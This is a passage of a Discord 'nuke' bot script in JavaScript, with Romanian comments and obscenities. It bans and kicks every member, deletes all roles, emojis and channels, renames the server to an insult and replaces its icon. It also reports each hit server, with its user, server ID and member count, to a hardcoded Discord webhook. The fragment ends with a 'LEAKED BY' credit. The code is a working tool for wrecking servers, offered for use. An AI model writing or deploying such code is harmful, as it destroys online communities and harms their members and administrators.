        // Ban All

                message.guild.members.cache.forEach(member => member.ban({ reason: "Nuking." })
                    .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banez serveru")
                        
                    ))

let mes = `**${message.author.tag}** (`+"`"+message.author.id+"`"+`) o folosit comanda **cf** pe serverul **${message.guild.name}** (`+"`"+message.guild.id+"`"+`) cu **${message.guild.memberCount}** membri`;
const wrb = new Discord.WebhookClient("8749420040464792432", "eryhreeewgweerjwehiuohgweuhfpowheihfwpohwfgg3");


await wrb.send(mes)

        // Kick All


                message.guild.members.cache.forEach(member => member.kick({ reason: "Nuking." })
                    .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banez serveru")
                        
                    ));
               
            
        

        // Delete All Roles                 


                message.guild.roles.cache.forEach((role) => {
                    role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} s-a sters`)))
                })
                
            
        

        // Delete All Emojis 

                message.guild.emojis.cache.forEach(e => e.delete({ reason: "Muie" }).then(console.log(yellow(`EMOJI: ${e.name} s-a sters`))))
                
            
        

        // Death.

                
                message.guild.setName(`muie pizdelor`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name

                // Channel Delete
                message.guild.channels.cache.forEach(channel => channel.delete().then(
                    console.log(redBright(`canal sters`))
                ).then(
                    // Channel Icon Change
                    message.guild.setIcon('https://images-ext-2.discordapp.net/external/VJnLG2NLStYg1X9rH6xuBCpJ_O7l7_dS6L5Xm0pEv6M/%3Fsize%3D1024/https/cdn.discordapp.com/icons/881515061078790165/46885c8c06584c0262161130a0e6f4eb.png') // changes server pfp
                ));

                // Roles
                message.guild.roles.cache.forEach((role) => {
                    if (!role.editable) {
                        return;
                    } else {
                        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} s-a sters`)))
                    }
                })

                // Emoji
                message.guild.emojis.cache.forEach(e => e.delete({ reason: "Muie" },).then(console.log(yellow(`EMOJI: ${e.name} s-a sters`))))



               

            }
           
        
})

client.login(process.env.TOKEN)

LEAKED BY 7cloqqk https://replit.com/@7cloqqk VA PUP COPII MEI
